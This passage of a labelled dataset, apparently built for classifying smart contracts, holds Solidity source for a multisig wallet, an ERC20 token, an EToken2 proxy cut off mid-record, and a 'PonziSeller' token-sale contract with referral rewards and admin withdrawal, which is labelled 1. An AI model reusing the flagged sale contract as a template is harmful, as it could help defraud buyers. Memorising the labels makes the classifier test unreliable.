}\r\r\n\r\r\n    \/\/\/ @dev Allows to add a new owner. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param owner Address of new owner.\r\r\n    function addOwner(address owner)\r\r\n        public\r\r\n        onlyWallet\r\r\n        ownerDoesNotExist(owner)\r\r\n        notNull(owner)\r\r\n        validRequirement(owners.length + 1, required)\r\r\n    {\r\r\n        isOwner[owner] = true;\r\r\n        owners.push(owner);\r\r\n        OwnerAddition(owner);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows to remove an owner. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param owner Address of owner.\r\r\n    function removeOwner(address owner)\r\r\n        public\r\r\n        onlyWallet\r\r\n        ownerExists(owner)\r\r\n    {\r\r\n        isOwner[owner] = false;\r\r\n        for (uint i=0; i<owners.length - 1; i++)\r\r\n            if (owners[i] == owner) {\r\r\n                owners[i] = owners[owners.length - 1];\r\r\n                break;\r\r\n            }\r\r\n        owners.length -= 1;\r\r\n        if (required > owners.length)\r\r\n            changeRequirement(owners.length);\r\r\n        OwnerRemoval(owner);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows to replace an owner with a new owner. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param owner Address of owner to be replaced.\r\r\n    \/\/\/ @param owner Address of new owner.\r\r\n    function replaceOwner(address owner, address newOwner)\r\r\n        public\r\r\n        onlyWallet\r\r\n        ownerExists(owner)\r\r\n        ownerDoesNotExist(newOwner)\r\r\n    {\r\r\n        for (uint i=0; i<owners.length; i++)\r\r\n            if (owners[i] == owner) {\r\r\n                owners[i] = newOwner;\r\r\n                break;\r\r\n            }\r\r\n        isOwner[owner] = false;\r\r\n        isOwner[newOwner] = true;\r\r\n        OwnerRemoval(owner);\r\r\n        OwnerAddition(newOwner);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows to change the number of required confirmations. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param _required Number of required confirmations.\r\r\n    function changeRequirement(uint _required)\r\r\n        public\r\r\n        onlyWallet\r\r\n        validRequirement(owners.length, _required)\r\r\n    {\r\r\n        required = _required;\r\r\n        RequirementChange(_required);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows an owner to submit and confirm a transaction.\r\r\n    \/\/\/ @param destination Transaction target address.\r\r\n    \/\/\/ @param value Transaction ether value.\r\r\n    \/\/\/ @param data Transaction data payload.\r\r\n    \/\/\/ @return Returns transaction ID.\r\r\n    function submitTransaction(address destination, uint value, bytes data)\r\r\n        public\r\r\n        returns (uint transactionId)\r\r\n    {\r\r\n        transactionId = addTransaction(destination, value, data);\r\r\n        confirmTransaction(transactionId);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows an owner to confirm a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    function confirmTransaction(uint transactionId)\r\r\n        public\r\r\n        ownerExists(msg.sender)\r\r\n        transactionExists(transactionId)\r\r\n        notConfirmed(transactionId, msg.sender)\r\r\n    {\r\r\n        confirmations[transactionId][msg.sender] = true;\r\r\n        Confirmation(msg.sender, transactionId);\r\r\n        executeTransaction(transactionId);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows an owner to revoke a confirmation for a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    function revokeConfirmation(uint transactionId)\r\r\n        public\r\r\n        ownerExists(msg.sender)\r\r\n        confirmed(transactionId, msg.sender)\r\r\n        notExecuted(transactionId)\r\r\n    {\r\r\n        confirmations[transactionId][msg.sender] = false;\r\r\n        Revocation(msg.sender, transactionId);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows anyone to execute a confirmed transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    function executeTransaction(uint transactionId)\r\r\n        public\r\r\n        notExecuted(transactionId)\r\r\n    {\r\r\n        if (isConfirmed(transactionId)) {\r\r\n            Transaction tx = transactions[transactionId];\r\r\n            tx.executed = true;\r\r\n            if (tx.destination.call.value(tx.value)(tx.data))\r\r\n                Execution(transactionId);\r\r\n            else {\r\r\n                ExecutionFailure(transactionId);\r\r\n                tx.executed = false;\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns the confirmation status of a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    \/\/\/ @return Confirmation status.\r\r\n    function isConfirmed(uint transactionId)\r\r\n        public\r\r\n        constant\r\r\n        returns (bool)\r\r\n    {\r\r\n        uint count = 0;\r\r\n        for (uint i=0; i<owners.length; i++) {\r\r\n            if (confirmations[transactionId][owners[i]])\r\r\n                count += 1;\r\r\n            if (count == required)\r\r\n                return true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Internal functions\r\r\n     *\/\r\r\n    \/\/\/ @dev Adds a new transaction to the transaction mapping, if transaction does not exist yet.\r\r\n    \/\/\/ @param destination Transaction target address.\r\r\n    \/\/\/ @param value Transaction ether value.\r\r\n    \/\/\/ @param data Transaction data payload.\r\r\n    \/\/\/ @return Returns transaction ID.\r\r\n    function addTransaction(address destination, uint value, bytes data)\r\r\n        internal\r\r\n        notNull(destination)\r\r\n        returns (uint transactionId)\r\r\n    {\r\r\n        transactionId = transactionCount;\r\r\n        transactions[transactionId] = Transaction({\r\r\n            destination: destination,\r\r\n            value: value,\r\r\n            data: data,\r\r\n            executed: false\r\r\n        });\r\r\n        transactionCount += 1;\r\r\n        Submission(transactionId);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Web3 call functions\r\r\n     *\/\r\r\n    \/\/\/ @dev Returns number of confirmations of a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    \/\/\/ @return Number of confirmations.\r\r\n    function getConfirmationCount(uint transactionId)\r\r\n        public\r\r\n        constant\r\r\n        returns (uint count)\r\r\n    {\r\r\n        for (uint i=0; i<owners.length; i++)\r\r\n            if (confirmations[transactionId][owners[i]])\r\r\n                count += 1;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns total number of transactions after filters are applied.\r\r\n    \/\/\/ @param pending Include pending transactions.\r\r\n    \/\/\/ @param executed Include executed transactions.\r\r\n    \/\/\/ @return Total number of transactions after filters are applied.\r\r\n    function getTransactionCount(bool pending, bool executed)\r\r\n        public\r\r\n        constant\r\r\n        returns (uint count)\r\r\n    {\r\r\n        for (uint i=0; i<transactionCount; i++)\r\r\n            if (   pending && !transactions[i].executed\r\r\n                || executed && transactions[i].executed)\r\r\n                count += 1;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns list of owners.\r\r\n    \/\/\/ @return List of owner addresses.\r\r\n    function getOwners() public constant returns (address[] owners) {\r\r\n        return owners;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns array with owner addresses, which confirmed transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    \/\/\/ @return Returns array of owner addresses.\r\r\n    function getConfirmations(uint transactionId)\r\r\n        public\r\r\n        constant\r\r\n        returns (address[] _confirmations)\r\r\n    {\r\r\n        address[] memory confirmationsTemp = new address[](owners.length);\r\r\n        uint count = 0;\r\r\n        uint i;\r\r\n        for (i=0; i<owners.length; i++)\r\r\n            if (confirmations[transactionId][owners[i]]) {\r\r\n                confirmationsTemp[count] = owners[i];\r\r\n                count += 1;\r\r\n            }\r\r\n        _confirmations = new address[](count);\r\r\n        for (i=0; i<count; i++)\r\r\n            _confirmations[i] = confirmationsTemp[i];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns list of transaction IDs in defined range.\r\r\n    \/\/\/ @param from Index start position of transaction array.\r\r\n    \/\/\/ @param to Index end position of transaction array.\r\r\n    \/\/\/ @param pending Include pending transactions.\r\r\n    \/\/\/ @param executed Include executed transactions.\r\r\n    \/\/\/ @return Returns array of transaction IDs.\r\r\n    function getTransactionIds(uint from, uint to, bool pending, bool executed)\r\r\n        public\r\r\n        constant\r\r\n        returns (uint[] _transactionIds)\r\r\n    {\r\r\n        uint[] memory transactionIdsTemp = new uint[](transactionCount);\r\r\n        uint count = 0;\r\r\n        uint i;\r\r\n        for (i=0; i<transactionCount; i++)\r\r\n            if (   pending && !transactions[i].executed\r\r\n                || executed && transactions[i].executed)\r\r\n            {\r\r\n                transactionIdsTemp[count] = i;\r\r\n                count += 1;\r\r\n            }\r\r\n        _transactionIds = new uint[](to - from);\r\r\n        for (i=from; i<to; i++)\r\r\n            _transactionIds[i - from] = transactionIdsTemp[i];\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ NOVA token contract\r\r\n\/\/\r\r\n\/\/ Symbol : NVT\r\r\n\/\/ Name : NOVA TOKEN\r\r\n\/\/ Total supply: 100,000,000,000.000000000000000000\r\r\n\/\/ Decimals : 18\r\r\n\/\/\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\r\r\n\r\r\nlibrary SafeMath {\r\r\n    function add(uint a, uint b) internal pure returns (uint c) {\r\r\n        c = a + b;\r\r\n        require(c >= a);\r\r\n    }\r\r\n    function sub(uint a, uint b) internal pure returns (uint c) {\r\r\n        require(b <= a);\r\r\n        c = a - b;\r\r\n    }\r\r\n    function mul(uint a, uint b) internal pure returns (uint c) {\r\r\n        c = a * b;\r\r\n        require(a == 0 || c \/ a == b);\r\r\n    }\r\r\n    function div(uint a, uint b) internal pure returns (uint c) {\r\r\n        require(b > 0);\r\r\n        c = a \/ b;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\ncontract ERC20Interface {\r\r\n    function totalSupply() public constant returns (uint);\r\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance);\r\r\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\r\r\n    function transfer(address to, uint tokens) public returns (bool success);\r\r\n    function approve(address spender, uint tokens) public returns (bool success);\r\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\r\n\r\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\r\n}\r\r\n\r\r\n\r\r\ncontract ApproveAndCallFallBack {\r\r\n    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\r\r\n}\r\r\n\r\r\n\r\r\ncontract Owned {\r\r\n    address public owner;\r\r\n    address public newOwner;\r\r\n\r\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\r\n\r\r\n    function Owned() public {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n \r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\r\n        newOwner = _newOwner;\r\r\n    }\r\r\n    function acceptOwnership() public {\r\r\n        require(msg.sender == newOwner);\r\r\n        OwnershipTransferred(owner, newOwner);\r\r\n        owner = newOwner;\r\r\n        newOwner = address(0);\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\ncontract NovaToken is ERC20Interface, Owned {\r\r\n    using SafeMath for uint;\r\r\n\r\r\n    string public symbol;\r\r\n    string public  name;\r\r\n    uint8 public decimals;\r\r\n    uint public _totalSupply;\r\r\n\r\r\n    mapping(address => uint) balances;\r\r\n    mapping(address => mapping(address => uint)) allowed;\r\r\n\r\r\n\r\r\n    function NovaToken() public {\r\r\n        symbol = \"NVT\";\r\r\n        name = \"Nova Token\";\r\r\n        decimals = 18;\r\r\n        _totalSupply = 100000000000 * 10**uint(decimals);\r\r\n        balances[owner] = _totalSupply;\r\r\n        Transfer(address(0), owner, _totalSupply);\r\r\n    }\r\r\n\r\r\n\r\r\n    function totalSupply() public constant returns (uint) {\r\r\n        return _totalSupply  - balances[address(0)];\r\r\n    }\r\r\n \r\r\n \r\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance) {\r\r\n        return balances[tokenOwner];\r\r\n    }\r\r\n\r\r\n \r\r\n    function transfer(address to, uint tokens) public returns (bool success) {\r\r\n        balances[msg.sender] = balances[msg.sender].sub(tokens);\r\r\n        balances[to] = balances[to].add(tokens);\r\r\n        Transfer(msg.sender, to, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    function approve(address spender, uint tokens) public returns (bool success) {\r\r\n        allowed[msg.sender][spender] = tokens;\r\r\n        Approval(msg.sender, spender, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\r\n        balances[from] = balances[from].sub(tokens);\r\r\n        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\r\n        balances[to] = balances[to].add(tokens);\r\r\n        Transfer(from, to, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\r\r\n        return allowed[tokenOwner][spender];\r\r\n    }\r\r\n\r\r\n\r\r\n    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\r\r\n        allowed[msg.sender][spender] = tokens;\r\r\n        Approval(msg.sender, spender, tokens);\r\r\n        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    function () public payable {\r\r\n        revert();\r\r\n    }\r\r\n\r\r\n\r\r\n    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\r\r\n        return ERC20Interface(tokenAddress).transfer(owner, tokens);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\/\/ see: https:\/\/github.com\/OpenZeppelin\/zeppelin-solidity\/blob\/master\/contracts\/math\/SafeMath.sol\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    if (a == 0) {\r\r\n      return 0;\r\r\n    }\r\r\n    uint256 c = a * b;\r\r\n    assert(c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn't hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/\/ Ponzi Token Minimal Interface\r\r\ncontract PonziTokenMinInterface {\r\r\n  function balanceOf(address owner) public view returns(uint256);\r\r\n  function transfer(address to, uint256 value) public returns (bool);\r\r\n}\r\r\n\r\r\n\r\r\ncontract PonziSeller {\r\r\n  using SafeMath for uint256;\r\r\n  enum AccessRank {\r\r\n    None,\r\r\n    SetPrice,\r\r\n    Withdraw,\r\r\n    Full\r\r\n  }\r\r\n\r\r\n  address private constant PONZI_ADDRESS = 0xc2807533832807Bf15898778D8A108405e9edfb1;\r\r\n  PonziTokenMinInterface private m_ponzi;\r\r\n  uint256 private m_ponziPriceInWei;\r\r\n  uint256 private m_rewardNum;\r\r\n  uint256 private m_rewardDen;\r\r\n  mapping(address => AccessRank) private m_admins;\r\r\n\r\r\n  event PriceChanged(address indexed who, uint256 newPrice);\r\r\n  event RewardRef(address indexed refAddr, uint256 ponziAmount);\r\r\n  event Withdrawal(address indexed to, uint256 amountInWei);\r\r\n  event ProvidingAccess(address indexed addr, AccessRank rank);\r\r\n  event PonziSold(\r\r\n    address indexed purchasedBy, \r\r\n    uint256 indexed priceInWei, \r\r\n    uint256 ponziAmount, \r\r\n    uint256 weiAmount, \r\r\n    address indexed refAddr \r\r\n  );\r\r\n  event NotEnoughPonzi(\r\r\n    address indexed addr, \r\r\n    uint256 weiAmount, \r\r\n    uint256 ponziPriceInWei, \r\r\n    uint256 ponziBalance\r\r\n  );\r\r\n\r\r\n  modifier onlyAdmin(AccessRank  r) {\r\r\n    require(m_admins[msg.sender] == r || m_admins[msg.sender] == AccessRank.Full);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function PonziSeller() public {\r\r\n    m_ponzi = PonziTokenMinInterface(PONZI_ADDRESS);\r\r\n    m_admins[msg.sender] = AccessRank.Full;\r\r\n    m_rewardNum = 1;\r\r\n    m_rewardDen = 1;\r\r\n  }\r\r\n\r\r\n  function() public payable {\r\r\n    byPonzi(address(0));\r\r\n  }\r\r\n\r\r\n  function setPonziAddress(address ponziAddr) public onlyAdmin(AccessRank.Full) {\r\r\n    m_ponzi = PonziTokenMinInterface(ponziAddr);\r\r\n  }\r\r\n\r\r\n  function ponziAddress() public view returns (address ponziAddr) {\r\r\n    return address(m_ponzi);\r\r\n  }\r\r\n\r\r\n  function ponziPriceInWei() public view returns (uint256) { \r\r\n    return m_ponziPriceInWei;\r\r\n  }\r\r\n\r\r\n  function setPonziPriceInWei(uint256 newPonziPriceInWei) public onlyAdmin(AccessRank.SetPrice) { \r\r\n    m_ponziPriceInWei = newPonziPriceInWei;\r\r\n    emit PriceChanged(msg.sender, m_ponziPriceInWei);\r\r\n  }\r\r\n\r\r\n  function rewardPercent() public view returns (uint256 numerator, uint256 denominator) {\r\r\n    numerator = m_rewardNum;\r\r\n    denominator = m_rewardDen;\r\r\n  }\r\r\n\r\r\n  function provideAccess(address adminAddr, uint8 rank) public onlyAdmin(AccessRank.Full) {\r\r\n    require(rank <= uint8(AccessRank.Full));\r\r\n    require(m_admins[adminAddr] != AccessRank.Full);\r\r\n    m_admins[adminAddr] = AccessRank(rank);\r\r\n  }\r\r\n\r\r\n  function setRewardPercent(uint256 newNumerator, uint256 newDenominator) public onlyAdmin(AccessRank.Full) {\r\r\n    require(newDenominator != 0);\r\r\n    m_rewardNum = newNumerator;\r\r\n    m_rewardDen = newDenominator;\r\r\n  }\r\r\n\r\r\n  function byPonzi(address refAddr) public payable {\r\r\n    require(m_ponziPriceInWei > 0 && msg.value > m_ponziPriceInWei);\r\r\n\r\r\n    uint256 refAmount = 0;\r\r\n    uint256 senderAmount = weiToPonzi(msg.value, m_ponziPriceInWei);\r\r\n\r\r\n    \/\/ check if ref addres is valid and calc reward\r\r\n    if (refAddr != msg.sender && refAddr != address(0) && refAddr != address(this)) {\r\r\n      refAmount = senderAmount.mul(m_rewardNum).div(m_rewardDen);\r\r\n    }\r\r\n    \/\/ check if we have enough ponzi on balance\r\r\n    if (availablePonzi() < senderAmount.add(refAmount)) {\r\r\n      emit NotEnoughPonzi(msg.sender, msg.value, m_ponziPriceInWei, availablePonzi());\r\r\n      revert();\r\r\n    }\r\r\n  \r\r\n    \/\/ transfer ponzi to sender\r\r\n    require(m_ponzi.transfer(msg.sender, senderAmount));\r\r\n    \/\/ transfer ponzi to ref if needed\r\r\n    if (refAmount > 0) {\r\r\n      require(m_ponzi.transfer(refAddr, refAmount));\r\r\n      emit RewardRef(refAddr, refAmount);\r\r\n    }\r\r\n    emit PonziSold(msg.sender, m_ponziPriceInWei, senderAmount, msg.value, refAddr);\r\r\n  }\r\r\n\r\r\n  function availablePonzi() public view returns (uint256) {\r\r\n    return m_ponzi.balanceOf(address(this));\r\r\n  }\r\r\n\r\r\n  function withdraw() public onlyAdmin(AccessRank.Withdraw) {\r\r\n    require(address(this).balance > 0);\r\r\n    uint256 b = address(this).balance;\r\r\n    msg.sender.transfer(b);\r\r\n    assert(address(this).balance < b);\r\r\n    emit Withdrawal(msg.sender, b);\r\r\n  }\r\r\n\r\r\n  function weiToPonzi(uint256 weiAmount, uint256 tokenPrice) \r\r\n    internal \r\r\n    pure \r\r\n    returns(uint256 tokensAmount) \r\r\n  {\r\r\n    tokensAmount = weiAmount.div(tokenPrice);\r\r\n  }\r\r\n}","label":1}
{"code":"\/**\r\r\n * This software is a subject to Ambisafe License Agreement.\r\r\n * No use or distribution is allowed without written permission from Ambisafe.\r\r\n * https:\/\/www.ambisafe.co\/terms-of-use\/\r\r\n *\/\r\r\n\r\r\npragma solidity 0.4.8;\r\r\n\r\r\ncontract EToken2 {\r\r\n    function baseUnit(bytes32 _symbol) constant returns(uint8);\r\r\n    function name(bytes32 _symbol) constant returns(string);\r\r\n    function description(bytes32 _symbol) constant returns(string);\r\r\n    function owner(bytes32 _symbol) constant returns(address);\r\r\n    function isOwner(address _owner, bytes32 _symbol) constant returns(bool);\r\r\n    function totalSupply(bytes32 _symbol) constant returns(uint);\r\r\n    function balanceOf(address _holder, bytes32 _symbol) constant returns(uint);\r\r\n    function proxyTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference, address _sender) returns(bool);\r\r\n    function proxyApprove(address _spender, uint _value, bytes32 _symbol, address _sender) returns(bool);\r\r\n    function allowance(address _from, address _spender, bytes32 _symbol) constant returns(uint);\r\r\n    function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference, address _sender) returns(bool);\r\r\n}\r\r\n\r\r\ncontract Asset {\r\r\n    function _performTransferWithReference(address _to, uint _value, string _reference, address _sender) returns(bool);\r\r\n    function _performTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference, address _sender) returns(bool);\r\r\n    function _performApprove(address _spender, uint _value, address _sender) returns(bool);    \r\r\n    function _performTransferFromWithReference(address _from, address _to, uint _value, string _reference, address _sender) returns(bool);\r\r\n    function _performTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference, address _sender) returns(bool);\r\r\n    function _performGeneric(bytes _data, address _sender) payable returns(bytes32) {\r\r\n        throw;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract ERC20 {\r\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n    event Approval(address indexed from, address indexed spender, uint256 value);\r\r\n\r\r\n    function totalSupply() constant returns(uint256 supply);\r\r\n    function balanceOf(address _owner) constant returns(uint256 balance);\r\r\n    function transfer(address _to, uint256 _value) returns(bool success);\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns(bool success);\r\r\n    function approve(address _spender, uint256 _value) returns(bool success);\r\r\n    function allowance(address _owner, address _spender) constant returns(uint256 remaining);\r\r\n    function decimals() constant returns(uint8);\r\r\n}\r\r\n\r\r\ncontract AssetProxyInterface {\r\r\n    function _forwardApprove(address _spender, uint _value, address _sender) returns(bool);    \r\r\n    function _forwardTransferFromWithReference(address _from, address _to, uint _value, string _reference, address _sender) returns(bool);\r\r\n    function _forwardTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference, address _sender) returns(bool);\r\r\n}\r\r\n\r\r\ncontract Bytes32 {\r\r\n    function _bytes32(string _input) internal constant returns(bytes32 result) {\r\r\n        assembly {\r\r\n            result := mload(add(_input, 32))\r\r\n        }\r\r\n    }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title EToken2 Asset Proxy.\r\r\n *\r\r\n * Proxy implements ERC20 interface and acts as a gateway to a single EToken2 asset.\r\r\n * Proxy adds etoken2Symbol and caller(sender) when forwarding requests to EToken2.\r\r\n * Every request that is made by caller first sent to the specific asset implementation\r\r\n * contract, which then calls back to be forwarded onto EToken2.\r\r\n *\r\r\n * Calls flow: Caller ->\r\r\n *             Proxy.func(...) ->\r\r\n *             Asset._performFunc(..., Caller.address) ->\r\r\n *             Proxy._forwardFunc(..., Caller.address) ->\r\r\n *             Platform.proxyFunc(..., symbol, Caller.address)\r\r\n *\r\r\n * Generic call flow: Caller ->\r\r\n *             Proxy.unknownFunc(...) ->\r\r\n *             Asset._performGeneric(..., Caller.address) ->\r\r\n *             Asset.unknownFunc(...)\r\r\n *\r\r\n * Asset implementation contract is mutable, but each user have an option to stick with\r\r\n * old implementation, through explicit decision made in timely manner, if he doesn&#39;t agree\r\r\n * with new rules.\r\r\n * Each user have a possibility to upgrade to latest asset contract implementation, without the\r\r\n * possibility to rollback.\r\r\n *\r\r\n * Note: all the non constant functions return false instead of throwing in case if state change\r\r\n * didn&#39;t happen yet.\r\r\n *\/\r\r\ncontract MortgageUnits is ERC20, AssetProxyInterface, Bytes32 {\r\r\n    \/\/ Assigned EToken2, immutable.\r\r\n    EToken2 public etoken2;\r\r\n\r\r\n    \/\/ Assigned symbol, immutable.\r\r\n    bytes32 public etoken2Symbol;\r\r\n\r\r\n    \/\/ Assigned name, immutable. For UI.\r\r\n    string public name;\r\r\n    string public symbol;\r\r\n\r\r\n    \/**\r\r\n     * Sets EToken2 address, assigns symbol and name.\r\r\n     *\r\r\n     * Can be set only once.\r\r\n     *\r\r\n     * @param _etoken2 EToken2 contract address.\r\r\n     * @param _symbol assigned symbol.\r\r\n     * @param _name assigned name.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function init(EToken2 _etoken2, string _symbol, string _name) returns(bool) {\r\r\n        if (address(etoken2) != 0x0) {\r\r\n            return false;\r\r\n        }\r\r\n        etoken2 = _etoken2;\r\r\n        etoken2Symbol = _bytes32(_symbol);\r\r\n        name = _name;\r\r\n        symbol = _symbol;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Only EToken2 is allowed to call.\r\r\n     *\/\r\r\n    modifier onlyEToken2() {\r\r\n        if (msg.sender == address(etoken2)) {\r\r\n            _;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Only current asset owner is allowed to call.\r\r\n     *\/\r\r\n    modifier onlyAssetOwner() {\r\r\n        if (etoken2.isOwner(msg.sender, etoken2Symbol)) {\r\r\n            _;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns asset implementation contract for current caller.\r\r\n     *\r\r\n     * @return asset implementation contract.\r\r\n     *\/\r\r\n    function _getAsset() internal returns(Asset) {\r\r\n        return Asset(getVersionFor(msg.sender));\r\r\n    }\r\r\n\r\r\n    function recoverTokens(uint _value) onlyAssetOwner() returns(bool) {\r\r\n        return this.transferWithReference(msg.sender, _value, &#39;Tokens recovery&#39;);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns asset total supply.\r\r\n     *\r\r\n     * @return asset total supply.\r\r\n     *\/\r\r\n    function totalSupply() constant returns(uint) {\r\r\n        return etoken2.totalSupply(etoken2Symbol);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns asset balance for a particular holder.\r\r\n     *\r\r\n     * @param _owner holder address.\r\r\n     *\r\r\n     * @return holder balance.\r\r\n     *\/\r\r\n    function balanceOf(address _owner) constant returns(uint) {\r\r\n        return etoken2.balanceOf(_owner, etoken2Symbol);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns asset allowance from one holder to another.\r\r\n     *\r\r\n     * @param _from holder that allowed spending.\r\r\n     * @param _spender holder that is allowed to spend.\r\r\n     *\r\r\n     * @return holder to spender allowance.\r\r\n     *\/\r\r\n    function allowance(address _from, address _spender) constant returns(uint) {\r\r\n        return etoken2.allowance(_from, _spender, etoken2Symbol);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Returns asset decimals.\r\r\n     *\r\r\n     * @return asset decimals.\r\r\n     *\/\r\r\n    function decimals() constant returns(uint8) {\r\r\n        return etoken2.baseUnit(etoken2Symbol);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfers asset balance from the caller to specified receiver.\r\r\n     *\r\r\n     * @param _to holder address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transfer(address _to, uint _value) returns(bool) {\r\r\n        return transferWithReference(_to, _value, &#39;&#39;);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfers asset balance from the caller to specified receiver adding specified comment.\r\r\n     * Resolves asset implementation contract for the caller and forwards there arguments along with\r\r\n     * the caller address.\r\r\n     *\r\r\n     * @param _to holder address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     * @param _reference transfer comment to be included in a EToken2&#39;s Transfer event.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferWithReference(address _to, uint _value, string _reference) returns(bool) {\r\r\n        return _getAsset()._performTransferWithReference(_to, _value, _reference, msg.sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfers asset balance from the caller to specified ICAP.\r\r\n     *\r\r\n     * @param _icap recipient ICAP to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferToICAP(bytes32 _icap, uint _value) returns(bool) {\r\r\n        return transferToICAPWithReference(_icap, _value, &#39;&#39;);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Transfers asset balance from the caller to specified ICAP adding specified comment.\r\r\n     * Resolves asset implementation contract for the caller and forwards there arguments along with\r\r\n     * the caller address.\r\r\n     *\r\r\n     * @param _icap recipient ICAP to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     * @param _reference transfer comment to be included in a EToken2&#39;s Transfer event.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) {\r\r\n        return _getAsset()._performTransferToICAPWithReference(_icap, _value, _reference, msg.sender);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * Prforms allowance transfer of asset balance between holders.\r\r\n     *\r\r\n     * @param _from holder address to take from.\r\r\n     * @param _to holder address to give to.\r\r\n     * @param _value amount to transfer.\r\r\n     *\r\r\n     * @return success.\r\r\n     *\/\r\r\n    function transferFrom(address _from, address _to, uint 